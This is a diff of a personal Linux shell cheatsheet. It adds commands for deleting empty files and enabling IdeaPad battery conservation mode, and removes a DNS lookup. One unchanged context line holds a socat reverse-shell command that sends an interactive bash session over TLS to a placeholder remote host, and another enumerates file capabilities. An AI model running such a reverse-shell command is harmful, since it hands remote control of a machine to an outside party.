@@ -15,6 +15,9 @@ find . -type f -mtime +2
 # Change permissions of all files
 find . -type f -exec chmod <perm> {} +
 
+# Delete empty files
+find . -type f -empty -print -delete
+
 # Find all text files containing a specific word
 find . -type f -name "*.txt" -exec grep -iHn 'foo' {} +
 
@@ -26,6 +29,9 @@ cat <disk>/queue/scheduler
 
 # Check if IdeaPad conservative mode is enabled
 cat /sys/bus/platform/drivers/ideapad_acpi/VPC2004\:00/conservation_mode
+
+# Enable IdeaPad conservative mode (run as root)
+tee /sys/bus/platform/drivers/ideapad_acpi/VPC2004\:00/conservation_mode <<< 1
 
 # Find AMDGPU power state
 cat /sys/class/drm/<card>/device/power_dpm_state
@@ -41,9 +47,6 @@ socat OPENSSL:<REMOTE_IP>:<REMOTE_PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigi
 
 # Get globally available capabilities
 getcap -r / 2>/dev/null
-
-# Query domain DNS records
-nslookup -querytype=any <domain> <domain_ip>
 
 $ child_id: ps ux | awk '{ if ($8 == "Z+") print $2, $11 }' --- --map "awk '{ print $1 }'"
 $ disk: find /sys/block -name "nvme*" -o -name "sd*"
